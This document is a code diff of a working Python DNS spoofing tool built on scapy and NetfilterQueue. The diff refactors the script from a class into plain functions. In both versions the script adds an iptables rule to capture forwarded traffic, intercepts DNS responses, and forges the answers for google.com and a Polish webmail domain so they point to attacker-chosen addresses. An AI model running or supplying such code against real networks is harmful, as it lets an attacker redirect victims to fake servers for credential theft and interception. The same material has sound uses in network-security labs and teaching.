@@ -1,59 +1,57 @@
 import os
-import logging as log
 
 from scapy.layers.inet import IP, UDP
 from scapy.layers.dns import DNS, DNSRR, DNSQR
 from netfilterqueue import NetfilterQueue
 
+# Constants
+host_dict = {
+    b"google.com.": "10.10.10.10",
+    b"poczta.wp.pl.": "5.5.5.5"
+}
+queue_num = 1
+queue = NetfilterQueue()
 
-class DnsSnoof:
-    def __init__(self, host_dict, queue_num):
-        self.hostDict = host_dict
-        self.queueNum = queue_num
-        self.queue = NetfilterQueue()
 
-    def __call__(self):
-        log.info("Snoofing....")
-        os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
-        self.queue.bind(self.queueNum, self.call_back)
+def spoof():
+    os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {queue_num}')
+    print("Added iptables rule")
+    queue.bind(queue_num, callback)
+    try:
+        queue.run()
+    except KeyboardInterrupt:
+        os.system(f'iptables -D FORWARD -j NFQUEUE --queue-num {queue_num}')
+        print("Deleted iptables rule")
+
+
+def callback(captured_packet):
+    scapy_packet = IP(captured_packet.get_payload())
+    if scapy_packet.haslayer(DNSRR):
         try:
-            self.queue.run()
-        except KeyboardInterrupt:
-            os.system(f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
-            log.info("[!] iptable rule flushed")
-
-    def call_back(self, packet):
-        scapy_packet = IP(packet.get_payload())
-        if scapy_packet.haslayer(DNSRR):
-            try:
-                log.info(f'[original] {scapy_packet[DNSRR].summary()}')
-                query_name = scapy_packet[DNSQR].qname
-                if query_name in self.hostDict:
-                    scapy_packet[DNS].an = DNSRR(rrname=query_name, rdata=self.hostDict[query_name])
-                    scapy_packet[DNS].ancount = 1
-                    del scapy_packet[IP].len
-                    del scapy_packet[IP].chksum
-                    del scapy_packet[UDP].len
-                    del scapy_packet[UDP].chksum
-                    log.info(f'[modified] {scapy_packet[DNSRR].summary()}')
-                else:
-                    log.info(f'[not modified] {scapy_packet[DNSRR].rdata}')
-            except IndexError as ie:
-                log.error(ie)
-            packet.set_payload(bytes(scapy_packet))
-        return packet.accept()
+            print("original")
+            # log.info(f'[original] {scapy_packet[DNSRR].summary()}')
+            query_name = scapy_packet[DNSQR].qname
+            if query_name in host_dict:
+                scapy_packet[DNS].an = DNSRR(rrname=query_name, rdata=host_dict[query_name])
+                scapy_packet[DNS].ancount = 1
+                del scapy_packet[IP].len
+                del scapy_packet[IP].chksum
+                del scapy_packet[UDP].len
+                del scapy_packet[UDP].chksum
+                print("modified")
+                # log.info(f'[modified] {scapy_packet[DNSRR].summary()}')
+            else:
+                print("not modified")
+                # log.info(f'[not modified] {scapy_packet[DNSRR].rdata}')
+        except IndexError as ie:
+            print("IndexError ", ie)
+        captured_packet.set_payload(bytes(scapy_packet))
+    return captured_packet.accept()
 
 
 if __name__ == '__main__':
     print("Start DNS Spoofing")
     try:
-        hostDict = {
-            b"google.com.": "10.10.10.10",
-            b"poczta.wp.pl.": "5.5.5.5"
-        }
-        queueNum = 1
-        log.basicConfig(format='%(asctime)s - %(message)s', level=log.INFO)
-        snoof = DnsSnoof(hostDict, queueNum)
-        snoof()
+        spoof()
     except OSError as ose:
-        log.error(ose)
+        print("OSError ", ose)
